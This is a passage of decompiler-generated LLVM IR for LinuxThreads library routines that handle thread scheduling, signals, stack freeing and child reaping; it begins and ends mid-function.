  %v7_804b32a = icmp slt i32 %v1_804b324, %arg1
  br i1 %v7_804b32a, label %dec_label_pc_804b32c, label %dec_label_pc_804b363

dec_label_pc_804b32c:                             ; preds = %entry
  %v1_804b331 = call i32 @sched_get_priority_max(i32 1)
  %v0_804b339 = load i32, i32* @ebx, align 4
  %v2_804b339 = sub i32 %v0_804b339, %v1_804b331
  %v8_804b339 = xor i32 %v0_804b339, %v1_804b331
  %v9_804b339 = xor i32 %v2_804b339, %v0_804b339
  %v10_804b339 = and i32 %v9_804b339, %v8_804b339
  %v11_804b339 = icmp slt i32 %v10_804b339, 0
  %v13_804b339 = icmp slt i32 %v2_804b339, 0
  %v2_804b33b = icmp ne i1 %v13_804b339, %v11_804b339
  %v3_804b33b = zext i1 %v2_804b33b to i32
  %v2_804b341 = add i32 %v3_804b33b, %v0_804b339
  store i32 %v2_804b341, i32* %stack_var_-8, align 4
  %v2_804b348 = ptrtoint i32* %stack_var_-8 to i32
  %v0_804b34f = load i32, i32* @global_var_8062514.140, align 4
  %v3_804b355 = call i32 @sched_setscheduler(i32 %v0_804b34f, i32 1, i32 %v2_804b348)
  %v0_804b35a = load i32, i32* @ebx, align 4
  store i32 %v0_804b35a, i32* @global_var_8062518.139, align 8
  br label %dec_label_pc_804b363

dec_label_pc_804b363:                             ; preds = %entry, %dec_label_pc_804b32c
  %.0 = phi i32 [ %v3_804b355, %dec_label_pc_804b32c ], [ undef, %entry ]
  store i32 %v0_804b31c, i32* @ebx, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v2_804b339, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_804b363, { 1, 0 }
}

define i32 @__pthread_manager_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %v0_804b370 = load i32, i32* @global_var_8062ea4.141, align 4
  %v1_804b375 = icmp eq i32 %v0_804b370, 0
  %v1_804b377 = icmp eq i1 %v1_804b375, false
  br i1 %v1_804b377, label %dec_label_pc_804b385.thread, label %dec_label_pc_804b385

dec_label_pc_804b385.thread:                      ; preds = %entry
  store i32 1, i32* @global_var_8062ea4.141, align 4
  br label %dec_label_pc_804b3c9

dec_label_pc_804b385:                             ; preds = %entry
  %v0_804b37b = load i32, i32* @global_var_8062ea8.142, align 8
  %v1_804b37b = icmp eq i32 %v0_804b37b, 0
  %v1_804b382 = icmp eq i1 %v1_804b37b, false
  %phitmp = icmp eq i1 %v1_804b382, false
  store i32 1, i32* @global_var_8062ea4.141, align 4
  br i1 %phitmp, label %dec_label_pc_804b3c9, label %dec_label_pc_804b393

dec_label_pc_804b393:                             ; preds = %dec_label_pc_804b385
  store i32 0, i32* %stack_var_-148, align 4
  %v2_804b3a3 = ptrtoint i32* %stack_var_-148 to i32
  br label %dec_label_pc_804b3a3

dec_label_pc_804b3a3:                             ; preds = %dec_label_pc_804b3bf, %dec_label_pc_804b393
  %v0_804b3ae = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804b3ae, i32* %stack_var_-188, align 4
  %v3_804b3b4 = call i32 @__libc_write(i32 %v0_804b3ae, i32 %v2_804b3a3, i32 148)
  %v1_804b3bc = add i32 %v3_804b3b4, 1
  %v8_804b3bc = icmp eq i32 %v1_804b3bc, 0
  %v1_804b3bd = icmp eq i1 %v8_804b3bc, false
  br i1 %v1_804b3bd, label %dec_label_pc_804b3c9, label %dec_label_pc_804b3bf

dec_label_pc_804b3bf:                             ; preds = %dec_label_pc_804b3a3
  %v0_804b3bf = load i32, i32* %stack_var_-188, align 4
  %v1_804b3bf = call i32 @__errno_location(i32 %v0_804b3bf)
  %v1_804b3c4 = inttoptr i32 %v1_804b3bf to i32*
  %v2_804b3c4 = load i32, i32* %v1_804b3c4, align 4
  %v11_804b3c4 = icmp eq i32 %v2_804b3c4, 4
  br i1 %v11_804b3c4, label %dec_label_pc_804b3a3, label %dec_label_pc_804b3bf.dec_label_pc_804b3c9.loopexit_crit_edge

dec_label_pc_804b3bf.dec_label_pc_804b3c9.loopexit_crit_edge: ; preds = %dec_label_pc_804b3bf
  br label %dec_label_pc_804b3c9

dec_label_pc_804b3c9:                             ; preds = %dec_label_pc_804b3a3, %dec_label_pc_804b385.thread, %dec_label_pc_804b3bf.dec_label_pc_804b3c9.loopexit_crit_edge, %dec_label_pc_804b385
  %v0_804b3cf = phi i32 [ %v0_804b370, %dec_label_pc_804b385 ], [ %v1_804b3bf, %dec_label_pc_804b3bf.dec_label_pc_804b3c9.loopexit_crit_edge ], [ %v0_804b370, %dec_label_pc_804b385.thread ], [ %v1_804b3bc, %dec_label_pc_804b3a3 ]
  ret i32 %v0_804b3cf

; uselistorder directives
  uselistorder i32* %stack_var_-148, { 1, 0 }
  uselistorder label %dec_label_pc_804b3c9, { 2, 0, 3, 1 }
}

define i32 @pthread_kill_all_threads() local_unnamed_addr {
dec_label_pc_804b3f8:
  %stack_var_-12 = alloca i32, align 4
  %v0_804b3d2 = load i32, i32* @eax, align 4
  %v0_804b3d4 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v0_804b3d9 = load i32, i32* @ebx, align 4
  store i32 %v0_804b3d9, i32* %stack_var_-12, align 4
  %v0_804b3da = load i32, i32* @edx, align 4
  store i32 %v0_804b3d4, i32* @ebx, align 4
  %v1_804b3f8 = icmp eq i32 %v0_804b3da, 0
  br i1 %v1_804b3f8, label %dec_label_pc_804b40a, label %dec_label_pc_804b3fc

dec_label_pc_804b3fc:                             ; preds = %dec_label_pc_804b3f8
  %v1_804b3ff = add i32 %v0_804b3d4, 20
  %v2_804b3ff = inttoptr i32 %v1_804b3ff to i32*
  %v3_804b3ff = load i32, i32* %v2_804b3ff, align 4
  %v2_804b402 = call i32 @kill(i32 %v3_804b3ff, i32 %v0_804b3d2)
  %v2_804b40a.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804b40a

dec_label_pc_804b40a:                             ; preds = %dec_label_pc_804b3f8, %dec_label_pc_804b3fc
  %v2_804b40a = phi i32 [ %v0_804b3d9, %dec_label_pc_804b3f8 ], [ %v2_804b40a.pre, %dec_label_pc_804b3fc ]
  %v0_804b40d = phi i32 [ %v0_804b3d4, %dec_label_pc_804b3f8 ], [ %v2_804b402, %dec_label_pc_804b3fc ]
  store i32 %v2_804b40a, i32* @ebx, align 4
  ret i32 %v0_804b40d

; uselistorder directives
  uselistorder i32 %v0_804b3d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b40a, { 1, 0 }
}

define i32 @pthread_start_thread(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804b40e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b41c = call i32 @__libc_getpid(i32 %v0_804b40e)
  %v1_804b421 = load i32, i32* @ebx, align 4
  %v2_804b421 = add i32 %v1_804b421, 20
  %v3_804b421 = inttoptr i32 %v2_804b421 to i32*
  store i32 %v1_804b41c, i32* %v3_804b421, align 4
  %v0_804b425 = load i32, i32* @ebx, align 4
  %v1_804b425 = add i32 %v0_804b425, 100
  store i32 %v1_804b425, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v3_804b42d = inttoptr i32 %v1_804b425 to %_TYPEDEF_sigset_t*
  %v4_804b42d = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_804b42d, i32 0)
  store i32 %v4_804b42d, i32* %eax.global-to-local, align 4
  %v0_804b432 = load i32, i32* @ebx, align 4
  %v1_804b432 = add i32 %v0_804b432, 228
  %v2_804b432 = inttoptr i32 %v1_804b432 to i32*
  %v3_804b432 = load i32, i32* %v2_804b432, align 4
  %v2_804b43b = icmp slt i32 %v3_804b432, 0
  br i1 %v2_804b43b, label %dec_label_pc_804b44a, label %dec_label_pc_804b43f

dec_label_pc_804b43f:                             ; preds = %entry
  %v1_804b440 = add i32 %v0_804b432, 232
  br label %dec_label_pc_804b469

dec_label_pc_804b44a:                             ; preds = %entry
  %v0_804b44a = load i32, i32* @global_var_8062518.139, align 8
  %tmp16 = icmp slt i32 %v0_804b44a, 1
  br i1 %tmp16, label %dec_label_pc_804b474, label %dec_label_pc_804b453

dec_label_pc_804b453:                             ; preds = %dec_label_pc_804b44a
  store i32 0, i32* %stack_var_-8, align 4
  %v2_804b45f = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_804b469

dec_label_pc_804b469:                             ; preds = %dec_label_pc_804b43f, %dec_label_pc_804b453
  %storemerge2 = phi i32 [ %v1_804b440, %dec_label_pc_804b43f ], [ %v2_804b45f, %dec_label_pc_804b453 ]
  %storemerge1 = phi i32 [ %v3_804b432, %dec_label_pc_804b43f ], [ 0, %dec_label_pc_804b453 ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_804b469 = add i32 %v0_804b432, 20
  %v2_804b469 = inttoptr i32 %v1_804b469 to i32*
  %v3_804b469 = load i32, i32* %v2_804b469, align 4
  store i32 %v3_804b469, i32* %stack_var_-188, align 4
  %v3_804b46c = call i32 @sched_setscheduler(i32 %v3_804b469, i32 %storemerge1, i32 %storemerge2)
  store i32 %v3_804b46c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b474

dec_label_pc_804b474:                             ; preds = %dec_label_pc_804b44a, %dec_label_pc_804b469
  %v0_804b474 = load i32, i32* @global_var_8067660.145, align 32
  store i32 %v0_804b474, i32* %eax.global-to-local, align 4
  %v1_804b479 = icmp eq i32 %v0_804b474, 0
  br i1 %v1_804b479, label %dec_label_pc_804b4c4, label %dec_label_pc_804b47d

dec_label_pc_804b47d:                             ; preds = %dec_label_pc_804b474
  %v0_804b47d = load i32, i32* @global_var_80626f0.146, align 16
  %tmp17 = icmp slt i32 %v0_804b47d, 1
  br i1 %tmp17, label %dec_label_pc_804b4c4, label %dec_label_pc_804b486

dec_label_pc_804b486:                             ; preds = %dec_label_pc_804b47d
  %v0_804b486 = load i32, i32* @ebx, align 4
  store i32 %v0_804b486, i32* %stack_var_-156, align 4
  %v2_804b492 = ptrtoint i32* %stack_var_-156 to i32
  br label %dec_label_pc_804b492

dec_label_pc_804b492:                             ; preds = %dec_label_pc_804b4ae, %dec_label_pc_804b486
  store i32 %v2_804b492, i32* %eax.global-to-local, align 4
  %v0_804b49d = load i32, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804b49d, i32* %stack_var_-188, align 4
  %v3_804b4a3 = call i32 @__libc_write(i32 %v0_804b49d, i32 %v2_804b492, i32 148)
  %v1_804b4ab = add i32 %v3_804b4a3, 1
  %v8_804b4ab = icmp eq i32 %v1_804b4ab, 0
  store i32 %v1_804b4ab, i32* %eax.global-to-local, align 4
  %v1_804b4ac = icmp eq i1 %v8_804b4ab, false
  br i1 %v1_804b4ac, label %dec_label_pc_804b4b8, label %dec_label_pc_804b4ae

dec_label_pc_804b4ae:                             ; preds = %dec_label_pc_804b492
  %v0_804b4ae = load i32, i32* %stack_var_-188, align 4
  %v1_804b4ae = call i32 @__errno_location(i32 %v0_804b4ae)
  store i32 %v1_804b4ae, i32* %eax.global-to-local, align 4
  %v1_804b4b3 = inttoptr i32 %v1_804b4ae to i32*
  %v2_804b4b3 = load i32, i32* %v1_804b4b3, align 4
  %v11_804b4b3 = icmp eq i32 %v2_804b4b3, 4
  br i1 %v11_804b4b3, label %dec_label_pc_804b492, label %dec_label_pc_804b4ae.dec_label_pc_804b4b8_crit_edge

dec_label_pc_804b4ae.dec_label_pc_804b4b8_crit_edge: ; preds = %dec_label_pc_804b4ae
  br label %dec_label_pc_804b4b8

dec_label_pc_804b4b8:                             ; preds = %dec_label_pc_804b492, %dec_label_pc_804b4ae.dec_label_pc_804b4b8_crit_edge
  %v0_804b4bb = load i32, i32* @ebx, align 4
  store i32 %v0_804b4bb, i32* %stack_var_-188, align 4
  %v1_804b4bc = call i32 @__pthread_wait_for_restart_signal(i32 %v0_804b4bb)
  store i32 %v1_804b4bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b4c4

dec_label_pc_804b4c4:                             ; preds = %dec_label_pc_804b47d, %dec_label_pc_804b474, %dec_label_pc_804b4b8
  %v0_804b4c7 = load i32, i32* @ebx, align 4
  %v1_804b4c7 = add i32 %v0_804b4c7, 96
  %v2_804b4c7 = inttoptr i32 %v1_804b4c7 to i32*
  %v3_804b4c7 = load i32, i32* %v2_804b4c7, align 4
  store i32 %v3_804b4c7, i32* %stack_var_-188, align 4
  %v5_804b4ca = add i32 %v0_804b4c7, 92
  %v6_804b4ca = inttoptr i32 %v5_804b4ca to i32*
  %v7_804b4ca = load i32, i32* %v6_804b4ca, align 4
  call void @__pseudo_call(i32 %v7_804b4ca)
  store i32 %v3_804b4c7, i32* @ecx, align 4
  %v2_804b4cf = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_804b4cf, i32* %stack_var_-188, align 4
  %v0_804b4d7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b4d8 = call i32 @__pthread_do_exit(i32 %v0_804b4d7, i32 %v2_804b4cf)
  store i32 %v2_804b4d8, i32* %eax.global-to-local, align 4
  ret i32 %v2_804b4d8

; uselistorder directives
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 3, 2, 4, 6, 7, 10, 8, 9 }
  uselistorder label %dec_label_pc_804b4c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_804b474, { 1, 0 }
  uselistorder label %dec_label_pc_804b469, { 1, 0 }
}

define i32 @pthread_start_thread_event(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804b4dd = load i32, i32* @ebx, align 4
  store i32 %v0_804b4dd, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804b4e5 = call i32 @__libc_getpid(i32 %v0_804b4dd)
  store i32 0, i32* @edx, align 4
  %v1_804b4ec = load i32, i32* @ebx, align 4
  %v2_804b4ec = add i32 %v1_804b4ec, 20
  %v3_804b4ec = inttoptr i32 %v2_804b4ec to i32*
  store i32 %v1_804b4e5, i32* %v3_804b4ec, align 4
  %v0_804b4ef = load i32, i32* @ebx, align 4
  %v1_804b4ef = add i32 %v0_804b4ef, 28
  %v2_804b4ef = inttoptr i32 %v1_804b4ef to i32*
  %v3_804b4ef = load i32, i32* %v2_804b4ef, align 4
  store i32 %v3_804b4ef, i32* @eax, align 4
  %v0_804b4f2 = load i32, i32* %stack_var_-4, align 4
  %v1_804b4f2 = call i32 @__pthread_lock(i32 %v0_804b4f2)
  %v0_804b4fa = load i32, i32* @ebx, align 4
  %v1_804b4fa = add i32 %v0_804b4fa, 28
  %v2_804b4fa = inttoptr i32 %v1_804b4fa to i32*
  %v3_804b4fa = load i32, i32* %v2_804b4fa, align 4
  %v1_804b4fd = inttoptr i32 %v3_804b4fa to i32*
  %v2_804b4fd = call i32 @__pthread_unlock(i32* %v1_804b4fd)
  %v0_804b502 = load i32, i32* @ebx, align 4
  %v1_804b505 = call i32 @pthread_start_thread(i32 %v0_804b502)
  ret i32 %v1_804b505
}

define i32 @pthread_free() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804b50a = load i32, i32* @esi, align 4
  %v0_804b50b = load i32, i32* @ebx, align 4
  %v0_804b50f = load i32, i32* @eax, align 4
  store i32 %v0_804b50f, i32* @esi, align 4
  %v1_804b511 = add i32 %v0_804b50f, 16
  %v2_804b511 = inttoptr i32 %v1_804b511 to i32*
  %v3_804b511 = load i32, i32* %v2_804b511, align 4
  store i32 0, i32* @edx, align 4
  %v1_804b516 = mul i32 %v3_804b511, 16
  %v2_804b51c = and i32 %v1_804b516, 16368
  %v1_804b51f = add i32 %v2_804b51c, ptrtoint (i32* @global_var_805e300.147 to i32)
  store i32 %v1_804b51f, i32* @ebx, align 4
  store i32 %v1_804b51f, i32* @eax, align 4
  %v1_804b527 = call i32 @__pthread_lock(i32 %v0_804b50b)
  %v0_804b52f = load i32, i32* @ebx, align 4
  %v1_804b52f = add i32 %v0_804b52f, 8
  %v2_804b52f = inttoptr i32 %v1_804b52f to i32*
  store i32 0, i32* %v2_804b52f, align 4
  %v0_804b536 = load i32, i32* @ebx, align 4
  %v1_804b536 = add i32 %v0_804b536, 12
  %v2_804b536 = inttoptr i32 %v1_804b536 to i32*
  store i32 -1, i32* %v2_804b536, align 4
  %v0_804b53d = load i32, i32* @ebx, align 4
  %v1_804b53e = inttoptr i32 %v0_804b53d to i32*
  %v2_804b53e = call i32 @__pthread_unlock(i32* %v1_804b53e)
  %v0_804b543 = load i32, i32* @global_var_8062300.148, align 256
  %v1_804b548 = add i32 %v0_804b543, -1
  store i32 %v1_804b548, i32* @global_var_8062300.148, align 256
  %v0_804b54e = load i32, i32* @esi, align 4
  %v1_804b54e = add i32 %v0_804b54e, 448
  %v2_804b54e = inttoptr i32 %v1_804b54e to i32*
  %storemerge23 = load i32, i32* %v2_804b54e, align 4
  %v1_804b56624 = icmp eq i32 %storemerge23, 0
  %v1_804b56825 = icmp eq i1 %v1_804b56624, false
  br i1 %v1_804b56825, label %dec_label_pc_804b556.lr.ph, label %dec_label_pc_804b56a

dec_label_pc_804b556.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804b556

dec_label_pc_804b556:                             ; preds = %dec_label_pc_804b556.lr.ph, %dec_label_pc_804b556
  %storemerge26 = phi i32 [ %storemerge23, %dec_label_pc_804b556.lr.ph ], [ %storemerge, %dec_label_pc_804b556 ]
  %v1_804b559 = inttoptr i32 %storemerge26 to i32*
  %v2_804b559 = load i32, i32* %v1_804b559, align 4
  store i32 %v2_804b559, i32* @ebx, align 4
  %v1_804b55c = call i32 @free(i32 %storemerge26)
  %storemerge = load i32, i32* @ebx, align 4
  %v1_804b566 = icmp eq i32 %storemerge, 0
  %v1_804b568 = icmp eq i1 %v1_804b566, false
  br i1 %v1_804b568, label %dec_label_pc_804b556, label %dec_label_pc_804b563.dec_label_pc_804b56a_crit_edge

dec_label_pc_804b563.dec_label_pc_804b56a_crit_edge: ; preds = %dec_label_pc_804b556
  %v0_804b56a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b56a

dec_label_pc_804b56a:                             ; preds = %dec_label_pc_804b563.dec_label_pc_804b56a_crit_edge, %entry
  %v0_804b56a = phi i32 [ %v0_804b56a.pre, %dec_label_pc_804b563.dec_label_pc_804b56a_crit_edge ], [ %v0_804b54e, %entry ]
  %v1_804b56a = add i32 %v0_804b56a, 452
  %v2_804b56a = inttoptr i32 %v1_804b56a to i32*
  %v3_804b56a = load i32, i32* %v2_804b56a, align 4
  %v1_804b5823 = icmp eq i32 %v3_804b56a, 0
  %v1_804b58410 = icmp eq i1 %v1_804b5823, false
  br i1 %v1_804b58410, label %dec_label_pc_804b572.preheader, label %dec_label_pc_804b586

dec_label_pc_804b572.preheader:                   ; preds = %dec_label_pc_804b56a
  br label %dec_label_pc_804b572

dec_label_pc_804b572:                             ; preds = %dec_label_pc_804b572.preheader, %dec_label_pc_804b572
  %v0_804b575 = phi i32 [ %v0_804b57d, %dec_label_pc_804b572 ], [ %v3_804b56a, %dec_label_pc_804b572.preheader ]
  %v1_804b575 = inttoptr i32 %v0_804b575 to i32*
  %v2_804b575 = load i32, i32* %v1_804b575, align 4
  store i32 %v2_804b575, i32* @ebx, align 4
  %v1_804b578 = call i32 @free(i32 %v0_804b575)
  %v0_804b57d = load i32, i32* @ebx, align 4
  %v1_804b582 = icmp eq i32 %v0_804b57d, 0
  %v1_804b584 = icmp eq i1 %v1_804b582, false
  br i1 %v1_804b584, label %dec_label_pc_804b572, label %dec_label_pc_804b582.dec_label_pc_804b586_crit_edge

dec_label_pc_804b582.dec_label_pc_804b586_crit_edge: ; preds = %dec_label_pc_804b572
  %v0_804b586.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b586

dec_label_pc_804b586:                             ; preds = %dec_label_pc_804b582.dec_label_pc_804b586_crit_edge, %dec_label_pc_804b56a
  %v0_804b5a4 = phi i32 [ %v0_804b586.pre, %dec_label_pc_804b582.dec_label_pc_804b586_crit_edge ], [ %v0_804b56a, %dec_label_pc_804b56a ]
  %v6_804b586 = icmp eq i32 %v0_804b5a4, 134619936
  br i1 %v6_804b586, label %dec_label_pc_804b5c8, label %dec_label_pc_804b58e

dec_label_pc_804b58e:                             ; preds = %dec_label_pc_804b586
  %v1_804b58e = add i32 %v0_804b5a4, 392
  %v2_804b58e = inttoptr i32 %v1_804b58e to i32*
  %v3_804b58e = load i32, i32* %v2_804b58e, align 4
  %v4_804b58e = icmp eq i32 %v3_804b58e, 0
  %v1_804b595 = icmp eq i1 %v4_804b58e, false
  br i1 %v1_804b595, label %dec_label_pc_804b5c8, label %dec_label_pc_804b597

dec_label_pc_804b597:                             ; preds = %dec_label_pc_804b58e
  %v1_804b597 = add i32 %v0_804b5a4, 400
  %v2_804b597 = inttoptr i32 %v1_804b597 to i32*
  %v3_804b597 = load i32, i32* %v2_804b597, align 4
  %v1_804b59d = icmp eq i32 %v3_804b597, 0
  br i1 %v1_804b59d, label %dec_label_pc_804b5b2, label %dec_label_pc_804b5a1

dec_label_pc_804b5a1:                             ; preds = %dec_label_pc_804b597
  %v0_804b5a1 = load i32, i32* @edx, align 4
  %v1_804b5a4 = add i32 %v0_804b5a4, 396
  %v2_804b5a4 = inttoptr i32 %v1_804b5a4 to i32*
  %v3_804b5a4 = load i32, i32* %v2_804b5a4, align 4
  %v4_804b5aa = call i32 @munmap(i32 %v3_804b5a4, i32 %v3_804b597, i32 %v0_804b5a1, i32 %v0_804b5a1)
  %v0_804b5b4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b5b2

dec_label_pc_804b5b2:                             ; preds = %dec_label_pc_804b597, %dec_label_pc_804b5a1
  %v0_804b5b4 = phi i32 [ %v0_804b5b4.pre, %dec_label_pc_804b5a1 ], [ %v0_804b5a4, %dec_label_pc_804b597 ]
  %v0_804b5b2 = phi i32 [ %v4_804b5aa, %dec_label_pc_804b5a1 ], [ 0, %dec_label_pc_804b597 ]
  %v1_804b5b4 = add i32 %v0_804b5b4, -2096672
  %v4_804b5c0 = call i32 @munmap(i32 %v1_804b5b4, i32 2097152, i32 %v0_804b5b2, i32 %v0_804b5b2)
  br label %dec_label_pc_804b5c8

dec_label_pc_804b5c8:                             ; preds = %dec_label_pc_804b58e, %dec_label_pc_804b586, %dec_label_pc_804b5b2
  %v2_804b5c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804b50b, i32* @ebx, align 4
  store i32 %v0_804b50a, i32* @esi, align 4
  ret i32 %v2_804b5c8

; uselistorder directives
  uselistorder i32 %v0_804b5a4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_804b57d, { 1, 0 }
  uselistorder i32 %v0_804b575, { 1, 0 }
  uselistorder i32 %v0_804b56a, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder label %dec_label_pc_804b5c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b5b2, { 1, 0 }
  uselistorder label %dec_label_pc_804b572, { 1, 0 }
  uselistorder label %dec_label_pc_804b556, { 1, 0 }
}

define i32 @restart() local_unnamed_addr {
entry:
  %v0_804b5cf = load i32, i32* @eax, align 4
  %v1_804b5d0 = call i32 @__pthread_restart_new(i32 %v0_804b5cf)
  ret i32 %v1_804b5d0
}

define i32 @pthread_reap_children() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b5d9 = load i32, i32* @esi, align 4
  %v0_804b5da = load i32, i32* @ebx, align 4
  store i32 %v0_804b5da, i32* %stack_var_-8, align 4
  %v2_804b6b0 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_804b6aa

dec_label_pc_804b5e3:                             ; preds = %dec_label_pc_804b6aa
  %v0_804b5e3 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  br label %dec_label_pc_804b662

dec_label_pc_804b5ed:                             ; preds = %dec_label_pc_804b662
  %v1_804b5ed = add i32 %v0_804b5f4, 20
  %v2_804b5ed = inttoptr i32 %v1_804b5ed to i32*
  %v3_804b5ed = load i32, i32* %v2_804b5ed, align 4
  %v15_804b5ed = icmp eq i32 %v3_804b5ed, %v3_804b6b7
  %v1_804b5f0 = inttoptr i32 %v0_804b5f4 to i32*
  %v2_804b5f0 = load i32, i32* %v1_804b5f0, align 4
  store i32 %v2_804b5f0, i32* %edx.global-to-local, align 4
  %v1_804b5f2 = icmp eq i1 %v15_804b5ed, false
  br i1 %v1_804b5f2, label %dec_label_pc_804b662, label %dec_label_pc_804b5f4

dec_label_pc_804b5f4:                             ; preds = %dec_label_pc_804b5ed
  %v1_804b5f4 = add i32 %v0_804b5f4, 4
  %v2_804b5f4 = inttoptr i32 %v1_804b5f4 to i32*
  %v3_804b5f4 = load i32, i32* %v2_804b5f4, align 4
  %v2_804b5f7 = add i32 %v2_804b5f0, 4
  %v3_804b5f7 = inttoptr i32 %v2_804b5f7 to i32*
  store i32 %v3_804b5f4, i32* %v3_804b5f7, align 4
  %v0_804b5fa = load i32, i32* @esi, align 4
  %v1_804b5fa = add i32 %v0_804b5fa, 4
  %v2_804b5fa = inttoptr i32 %v1_804b5fa to i32*
  %v3_804b5fa = load i32, i32* %v2_804b5fa, align 4
  %v0_804b5fd = load i32, i32* %edx.global-to-local, align 4
  %v2_804b5fd = inttoptr i32 %v3_804b5fa to i32*
  store i32 %v0_804b5fd, i32* %v2_804b5fd, align 4
  store i32 0, i32* @edx, align 4
  %v0_804b601 = load i32, i32* @esi, align 4
  %v1_804b601 = add i32 %v0_804b601, 28
  %v2_804b601 = inttoptr i32 %v1_804b601 to i32*
  %v3_804b601 = load i32, i32* %v2_804b601, align 4
  store i32 %v3_804b601, i32* @eax, align 4
  %v0_804b604 = load i32, i32* %stack_var_-8, align 4
  %v1_804b604 = call i32 @__pthread_lock(i32 %v0_804b604)
  %v0_804b609 = load i32, i32* @esi, align 4
  %v1_804b609 = add i32 %v0_804b609, 46
  %v2_804b609 = inttoptr i32 %v1_804b609 to i8*
  store i8 1, i8* %v2_804b609, align 1
  %v0_804b60d = load i32, i32* @esi, align 4
  %v1_804b60d = add i32 %v0_804b60d, 412
  %v2_804b60d = inttoptr i32 %v1_804b60d to i32*
  %v3_804b60d = load i32, i32* %v2_804b60d, align 4
  %v4_804b60d = icmp eq i32 %v3_804b60d, 0
  br i1 %v4_804b60d, label %dec_label_pc_804b641, label %dec_label_pc_804b616

dec_label_pc_804b616:                             ; preds = %dec_label_pc_804b5f4
  %v0_804b616 = load i32, i32* @global_var_8067654.149, align 4
  %v2_804b61b = add i32 %v0_804b60d, 416
  %v3_804b61b = inttoptr i32 %v2_804b61b to i32*
  %v4_804b61b = load i32, i32* %v3_804b61b, align 4
  %v5_804b61b = or i32 %v4_804b61b, %v0_804b616
  store i32 %v5_804b61b, i32* @eax, align 4
  %v3_804b621 = and i32 %v5_804b61b, 2048
  %v4_804b621 = icmp eq i32 %v3_804b621, 0
  br i1 %v4_804b621, label %dec_label_pc_804b641, label %dec_label_pc_804b626

dec_label_pc_804b626:                             ; preds = %dec_label_pc_804b616
  %v1_804b626 = add i32 %v0_804b60d, 424
  %v2_804b626 = inttoptr i32 %v1_804b626 to i32*
  store i32 12, i32* %v2_804b626, align 4
  %v0_804b630 = load i32, i32* @esi, align 4
  %v2_804b630 = add i32 %v0_804b630, 428
  %v3_804b630 = inttoptr i32 %v2_804b630 to i32*
  store i32 %v0_804b630, i32* %v3_804b630, align 4
  %v0_804b636 = load i32, i32* @esi, align 4
  store i32 %v0_804b636, i32* @global_var_806765c.150, align 4
  %v0_804b63c = call i32 @__linuxthreads_reap_event()
  %v0_804b644.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b641

dec_label_pc_804b641:                             ; preds = %dec_label_pc_804b616, %dec_label_pc_804b5f4, %dec_label_pc_804b626
  %v0_804b644 = phi i32 [ %v0_804b60d, %dec_label_pc_804b616 ], [ %v0_804b60d, %dec_label_pc_804b5f4 ], [ %v0_804b644.pre, %dec_label_pc_804b626 ]
  %v1_804b644 = add i32 %v0_804b644, 45
  %v2_804b644 = inttoptr i32 %v1_804b644 to i8*
  %v3_804b644 = load i8, i8* %v2_804b644, align 1
  %v4_804b644 = sext i8 %v3_804b644 to i32
  store i32 %v4_804b644, i32* @ebx, align 4
  %v1_804b648 = add i32 %v0_804b644, 28
  %v2_804b648 = inttoptr i32 %v1_804b648 to i32*
  %v3_804b648 = load i32, i32* %v2_804b648, align 4
  %v1_804b64b = inttoptr i32 %v3_804b648 to i32*
  %v2_804b64b = call i32 @__pthread_unlock(i32* %v1_804b64b)
  %v1_804b653 = icmp eq i8 %v3_804b644, 0
  br i1 %v1_804b653, label %dec_label_pc_804b666, label %dec_label_pc_804b657

dec_label_pc_804b657:                             ; preds = %dec_label_pc_804b641
  %v0_804b657 = load i32, i32* @esi, align 4
  store i32 %v0_804b657, i32* @eax, align 4
  %v0_804b659 = call i32 @pthread_free()
  br label %dec_label_pc_804b666

dec_label_pc_804b662:                             ; preds = %dec_label_pc_804b5ed, %dec_label_pc_804b5e3
